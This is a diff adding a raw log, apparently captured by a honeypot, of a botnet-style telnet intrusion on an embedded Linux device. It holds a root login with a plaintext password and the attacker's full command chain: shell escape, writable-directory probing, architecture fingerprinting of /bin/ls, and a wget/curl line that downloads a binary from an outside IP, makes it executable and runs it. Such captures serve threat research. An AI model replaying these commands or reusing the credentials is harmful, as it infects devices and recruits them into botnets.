@@ -1,0 +1,17 @@
+from: 45.229.54.246:46993 user:root password:Pon521
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x53\x50\x4f\x45\x44\x46'
+/bin/busybox wget;/bin/busybox echo -ne '\x53\x50\x4f\x45\x44\x46'
+/bin/busybox cat /bin/ls|head -n 1
+/bin/busybox hexdump -e '16/1 "%c"' -n 52 /bin/ls
+/bin/busybox cat /bin/ls|more
+dd bs=52 count=1 if=/bin/ls || cat /bin/ls || while read i; do echo $i; done < /bin/ls || while read i; do echo $i; done < /bin/busybox
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;rm -rf i;wget http://178.175.99.130:41108/i ||curl -O http://178.175.99.130:41108/i ||/bin/busybox wget http://178.175.99.130:41108/i;chmod 777 i ||(cp /bin/ls ii;cat i>ii &&rm i;cp ii i;rm ii);./i;/bin/busybox echo -e '\x51\x48\x42\x51\x53\x51\x41\x4d'
+[eof]
